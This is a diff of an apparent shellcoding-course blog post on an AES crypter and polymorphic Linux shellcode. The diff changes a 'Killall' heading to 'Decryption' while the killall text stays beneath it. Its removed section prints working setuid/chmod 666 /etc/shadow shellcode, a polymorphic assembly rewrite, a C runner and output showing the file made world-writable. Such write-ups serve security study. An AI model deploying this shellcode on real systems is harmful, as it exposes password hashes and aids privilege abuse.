@@ -28,8 +28,8 @@ Similar to the custom Encoder created in an earlier assignment, the concept is d
 The AES (Advanced Encryption Standard) cipher  algorithm also known as Rijndael, will be used to illustrate the concept of a custom Encoder:
 
 * Symmetric-key algorithm (same key used to encrypt and decrypt the data)
-* 128-bit block sizes
 * 3 different key sizes - 128/192/256 bits
+* 128-bit block sizes (data is divided into 4x4 arrays each containing 16 bytes)
 * High-speed performance and low RAM (memory) requirement when encrypting/decrypting 
 
 ![AES](/assets/images/AES.jpg) 
@@ -49,7 +49,7 @@ The execve-stack shellcode from the course material will be used as a reference 
 "\x31\xc0\x50\x68\x2f\x2f\x6c\x73\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
 ```
 
-A python script will be used as a Crypter wrapper to implement the AES encryption/decryption, referenced from Code Koala [http://www.codekoala.com/posts/aes-encryption-python-using-pycrypto/] [encryption-codekoala].
+A python script will be used as a Crypter wrapper to implement the AES encryption/decryption, referenced from Code Koala [http://www.codekoala.com/posts/aes-encryption-python-using-pycrypto] [encryption-codekoala].
 
 Note in this instance a static 128-bit key <code class="language-plaintext highlighter-rouge">DisShudBSecretEncryption</code> is hardcoded into the script for the sake of the POC to illustrate the concept, best practice is to randomly generate a key:
 
@@ -68,7 +68,7 @@ import base64
 
 def aes128(shc):
 
-#block size = 16 
+#block size = 16 byte arrays
  BLOCK_SIZE = 16 
  PADDING = '{'
  pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
@@ -97,7 +97,7 @@ JORa9JYDlDQi0SwuPPwAbqJZydd7ID1G+aUeYRJbEqUygnmo4zi+D0H4o2Dc/FJRJSUNfcu9zM33bg8N
 osboxes@osboxes:~/Downloads/SLAE$ 
 ```
 
-#### 2nd Shellcode (Killall)
+#### Decryption
 --------------
 
 The <code class="language-plaintext highlighter-rouge">killall</code> command on a Linux based system will literally terminate all running processes that are currently active on the target host’s machine.
@@ -206,143 +206,6 @@ Connection to 192.168.0.142 closed.
 ```
 
 The polymorphic version of the shellcode is 36% larger in size compared to the original reference from Shell-Storm.
-
-#### 3rd Shellcode (Chmod 666 /etc/shadow)
---------------
-
-The <code class="language-plaintext highlighter-rouge">chmod 666 /etc/shadow</code> command sets the permission on the shadow file allowing all users read/write access to the file (without execution rights).
-
-The shadow file is a high-value file which stores all the user passwords as a long string of characters combined with the hashing algorithm, as well as an optional salt value, revealing the hashed password of all users on the local system.
-
-Referenced from Shell-Storm [http://shell-storm.org/shellcode/files/shellcode-608.php] [chmod_etc_shadow-shellstorm]:
-
-```c
-/* 
- * Title: linux/x86 setuid(0) + chmod("/etc/shadow", 0666) Shellcode 37 Bytes
- * Type: Shellcode
- * Author: antrhacks
- * Platform: Linux X86
-*/
-
-/* ASSembly
- 31 db                	xor    %ebx,%ebx
- b0 17                	mov    $0x17,%al
- cd 80                	int    $0x80
- 31 c0                	xor    %eax,%eax
- 50                   	push   %eax
- 68 61 64 6f 77       	push   $0x776f6461
- 68 63 2f 73 68       	push   $0x68732f63
- 68 2f 2f 65 74       	push   $0x74652f2f
- 89 e3                	mov    %esp,%ebx
- 66 b9 b6 01          	mov    $0x1b6,%cx
- b0 0f                	mov    $0xf,%al
- cd 80                	int    $0x80
- 40                   	inc    %eax
- cd 80                	int    $0x80
-*/
-
-int main(){
- char shell[] = "\x31\xdb\xb0\x17\xcd\x80\x31\xc0\x50"
-"\x68\x61\x64\x6f\x77\x68\x63\x2f\x73\x68"
-"\x68\x2f\x2f\x65\x74\x89\xe3\x66\xb9\xb6\x01"
-"\xb0\x0f\xcd\x80\x40\xcd\x80";
-
- printf("[*] Taille du ShellCode = %d\n", strlen(shell));
- (*(void (*)()) shell)();
- 
- return 0;
-}
-```
-
-The polymorphic (modified) version of the original shellcode is scripted in Assembly:
-
-```nasm
-; Filname: chmod_etc_shadow_poly.nasm
-; Author: h3ll0clar1c3
-; Purpose: Chmod 666 /etc/shadow on the local host
-; Compilation: ./compile.sh chmod_etc_shadow_poly
-; Usage: sudo ./chmod_etc_shadow_poly
-; Shellcode size: 40 bytes
-; Architecture: x86
-
-global   _start
-
-section .text
-        _start:
-
-	sub ebx, ebx			; initialize register // changed the method
-	push 0x17			; push 0x17 onto the stack // changed the method
-	pop eax				; pop eax onto the stack // changed the method
-	int 0x80			; call the interrupt to execute the setuid syscall
-	sub eax, eax			; initialize register // changed the method
-	push eax			; push eax onto the stack
-	push 0x776f6461			; 'woda'	
-        push 0x68732f63			; 'hs/c'
-        push 0x74652f2f			; 'te//'
-	mov ebx, esp			; move esp into ebx
-	mov cl, 0xb6			; move 0xb6 into cl // replaced mov cx, 0x1b6
-	mov ch, 0x1			; move 0x1 into ch // replaced mov al, 0xf
-        add al, 15			; add 15 to al // added instruction
-        int 0x80			; call the interrupt to execute the chmod syscall
-        add eax, 1			; add 1 to eax // changed the method
-        int 0x80			; call the interrupt to exit
-```
-
-The Assembly code is compiled by assembling with Nasm, and compiled as an executable binary.
-
-Objdump is used to extract the shellcode from the <code class="language-plaintext highlighter-rouge">chmod 666 /etc/shadow</code> command in hex format (Null free):
-
-```bash
-osboxes@osboxes:~/Downloads/SLAE$ objdump -d ./chmod_etc_shadow_poly | grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g' 
-"\x29\xdb\x6a\x17\x58\xcd\x80\x29\xc0\x50\x68\x61\x64\x6f\x77\x68\x63\x2f\x73\x68\x68\x2f\x2f\x65\x74\x89\xe3\xb1\xb6\xb5\x01\x04\x0f\xcd\x80\x83\xc0\x01\xcd\x80"
-```
-
-A C program scripted with the newly generated shellcode:
-
-```c 
-/**
-* Filename: chmod_etc_shadow_poly_shellcode.c
-* Author: h3ll0clar1c3
-* Purpose: Chmod 666 /etc/shadow on the local host
-* Compilation: gcc -fno-stack-protector -z execstack -m32 chmod_etc_shadow_poly_shellcode.c -o chmod_etc_shadow_poly_final
-* Usage: sudo ./chmod_etc_shadow_poly_final
-* Shellcode size: 40 bytes
-* Architecture: x86
-**/
-
-#include <stdio.h>
-#include <string.h>
-
-unsigned char code[] = \
-"\x29\xdb\x6a\x17\x58\xcd\x80\x29\xc0\x50\x68\x61\x64\x6f\x77\x68\x63\x2f\x73\x68"
-"\x68\x2f\x2f\x65\x74\x89\xe3\xb1\xb6\xb5\x01\x04\x0f\xcd\x80\x83\xc0\x01\xcd\x80";
-
-int main()
-{
-        printf("Shellcode length: %d bytes\n", strlen(code));
-        int (*ret)() = (int(*)())code;
-        ret();
-}
-```
-
-The C program is compiled as an executable binary with stack-protection disabled, and executed resulting in a shellcode size of 40 bytes:
-
-```bash
-osboxes@osboxes:~/Downloads/SLAE$ ls -la /etc/shadow
--rw-r----- 1 root shadow 1219 May 31 00:14 /etc/shadow
-osboxes@osboxes:~/Downloads/SLAE$ stat --format '%a' /etc/shadow
-640
-osboxes@osboxes:~/Downloads/SLAE$ sudo ./chmod_etc_shadow_poly_final 
-[sudo] password for osboxes: 
-Shellcode length: 40 bytes
-osboxes@osboxes:~/Downloads/SLAE$ ls -la /etc/shadow
--rw-rw-rw- 1 root shadow 1219 May 31 00:14 /etc/shadow
-osboxes@osboxes:~/Downloads/SLAE$ stat --format '%a' /etc/shadow
-666
-osboxes@osboxes:~/Downloads/SLAE$ 
-```
-
-The polymorphic version of the shellcode is 8% larger in size compared to the original reference from Shell-Storm.
 
 ##### SLAE Disclaimer ####
 ---------
